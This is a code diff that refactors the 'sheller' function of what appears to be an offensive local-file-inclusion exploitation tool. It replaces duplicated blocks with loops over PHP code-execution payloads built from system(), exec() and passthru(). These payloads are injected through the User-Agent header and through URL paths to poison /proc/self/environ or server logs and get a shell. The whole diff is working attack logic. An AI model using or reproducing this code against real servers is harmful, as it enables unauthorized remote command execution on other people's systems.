@@ -734,6 +734,8 @@ def sheller(
         gui.show()
         app.processEvents()
 
+    file = ""
+
     if technique == 1:
         file = "/proc/self/environ"
     elif technique == 2:
@@ -863,152 +865,68 @@ def sheller(
                 prep = post_json(url, success[3], s)
 
         if technique == 1:
-            prep.headers[
-                "User-agent"
-            ] = '<?php system("{}"); ?>'.format(PAYLOAD)
-            sys.stdout.write("{0}  : Trying system():{1}      ".format(
-                color.RD, color.END
-            ))
-            if gui:
-                gui.crawlerResultDisplay.append(
-                    "  : Trying {}".format("system():      ")
-                )
-                gui.show()
-                app.processEvents()
-            try:
-                s.send(prep, timeout=timeout2)
-                show_status(gui)
-                if app:
+            user_agents = {
+                "system():      ": '<?php system("{}"); ?>'.format(PAYLOAD),
+                "exec():        ": '<?php exec("{}"); ?>'.format(PAYLOAD),
+                "passthru():    ": '<?php passthru("{}"); ?>'.format(PAYLOAD),
+            }
+            for name, value in user_agents.items():
+                prep.headers["User-agent"] = value
+                sys.stdout.write("{0}  : Trying {2}{1}".format(
+                    color.RD, color.END, name,
+                ))
+                if gui:
+                    gui.crawlerResultDisplay.append(
+                        "  : Trying {}".format(name)
+                    )
+                    gui.show()
                     app.processEvents()
-            except (
-                requests.exceptions.Timeout,
-                requests.exceptions.ConnectionError,
-            ):
-                show_status(gui, timeout=True)
-                if app:
-                    app.processEvents()
-            prep.headers[
-                "User-agent"
-            ] = '<?php exec("{}"); ?>'.format(PAYLOAD)
-            sys.stdout.write("{0}  : Trying exec():{1}        ".format(
-                color.RD, color.END,
-            ))
-            if gui:
-                gui.crawlerResultDisplay.append(
-                    "  : Trying {}".format("exec():        ")
-                )
-                gui.show()
-                app.processEvents()
-            try:
-                s.send(prep, timeout=timeout2)
-                show_status(gui)
-                if app:
-                    app.processEvents()
-            except (
-                requests.exceptions.Timeout,
-                requests.exceptions.ConnectionError
-            ):
-                show_status(gui, timeout=True)
-                if app:
-                    app.processEvents()
-            prep.headers[
-                "User-agent"
-            ] = '<?php passthru("{}"); ?>'.format(PAYLOAD)
-            sys.stdout.write("{0}  : Trying passthru():{1}    ".format(
-                color.RD, color.END
-            ))
-            if gui:
-                gui.crawlerResultDisplay.append(
-                    "  : Trying {}".format("passthru():    ")
-                )
-                gui.show()
-                app.processEvents()
-            try:
-                s.send(prep, timeout=timeout2)
-                show_status(gui)
-                if app:
-                    app.processEvents()
-            except (
-                requests.exceptions.Timeout,
-                requests.exceptions.ConnectionError,
-            ):
-                show_status(gui, timeout=True)
-                if app:
-                    app.processEvents()
+                try:
+                    s.send(prep, timeout=timeout2)
+                    show_status(gui)
+                    if app:
+                        app.processEvents()
+                except (
+                    requests.exceptions.Timeout,
+                    requests.exceptions.ConnectionError,
+                ):
+                    show_status(gui, timeout=True)
+                    if app:
+                        app.processEvents()
+
         elif technique == 2 or technique == 5:
+            url_paths = {
+                "system():      ": '<?php system("{}"); ?>'.format(PAYLOAD),
+                "exec():        ": '<?php exec("{}"); ?>'.format(PAYLOAD),
+                "passthru():    ": '<?php passthru("{}"); ?>'.format(PAYLOAD),
+            }
             req = requests.Request(method="GET", url=url)
             prep2 = s.prepare_request(req)
-            prep2.url = url + "/" + '<?php system("{}"); ?>'.format(PAYLOAD)
-            sys.stdout.write("{0}  : Trying system():{1}      ".format(
-                color.RD, color.END,
-            ))
-            if gui:
-                gui.crawlerResultDisplay.append(
-                    "  : Trying {}".format("system():      "),
-                )
-                gui.show()
-                app.processEvents()
-            try:
-                s.send(prep2, timeout=timeout)
-                s.send(prep, timeout=timeout2)
-                show_status(gui)
-                if app:
+            for name, value in url_paths.items():
+                prep2.url = url + "/" + value
+                sys.stdout.write("{0}  : Trying {2}{1}".format(
+                    color.RD, color.END, name,
+                ))
+                if gui:
+                    gui.crawlerResultDisplay.append(
+                        "  : Trying {}".format(name),
+                    )
+                    gui.show()
                     app.processEvents()
-            except (
-                requests.exceptions.Timeout,
-                requests.exceptions.ConnectionError,
-            ):
-                show_status(gui, timeout=True)
-                if app:
-                    app.processEvents()
-            prep2.url = url + "/" + '<?php exec("{}"); ?>'.format(PAYLOAD)
-            sys.stdout.write(
-                "{0}  : Trying exec():{1}        ".format(
-                    color.RD, color.END
-                )
-            )
-            if gui:
-                gui.crawlerResultDisplay.append(
-                    "  : Trying {}".format("exec():        ")
-                )
-                gui.show()
-                app.processEvents()
-            try:
-                s.send(prep2, timeout=timeout)
-                s.send(prep, timeout=timeout2)
-                show_status(gui)
-                if app:
-                    app.processEvents()
-            except (
-                requests.exceptions.Timeout,
-                requests.exceptions.ConnectionError,
-            ):
-                show_status(gui, timeout=True)
-                if app:
-                    app.processEvents()
-            prep2.url = url + "/" + '<?php passthru("{}"); ?>'.format(PAYLOAD)
-            sys.stdout.write("{0}  : Trying passthru():    {1}".format(
-                color.RD, color.END
-            ))
-            if gui:
-                gui.crawlerResultDisplay.append(
-                    "  : Trying {}".format("passthru():    ")
-                )
-                gui.show()
-                app.processEvents()
-            try:
-                s.send(prep2, timeout=timeout)
-                s.send(prep, timeout=timeout2)
-                show_status(gui)
-                if app:
-                    app.processEvents()
-            except (
-                requests.exceptions.Timeout,
-                requests.exceptions.ConnectionError,
-            ):
-                show_status(gui, timeout=True)
-                if app:
-                    app.processEvents()
+                try:
+                    s.send(prep2, timeout=timeout)
+                    s.send(prep, timeout=timeout2)
+                    show_status(gui)
+                    if app:
+                        app.processEvents()
+                except (
+                    requests.exceptions.Timeout,
+                    requests.exceptions.ConnectionError,
+                ):
+                    show_status(gui, timeout=True)
+                    if app:
+                        app.processEvents()
+
         elif technique == 3:
             tmp = url.split("://")[1]
             if "@" in tmp:
@@ -1057,6 +975,7 @@ def sheller(
                     show_status(gui, timeout=True)
                     if app:
                         app.processEvents()
+
         elif technique == 4:
             tmp = url.split("://")[1]
             if "@" in tmp:
@@ -1113,6 +1032,7 @@ def sheller(
                     show_status(gui, timeout=True)
                     if app:
                         app.processEvents()
+
         elif technique == 6:
             nullbyte_used = ""
             if nullist:
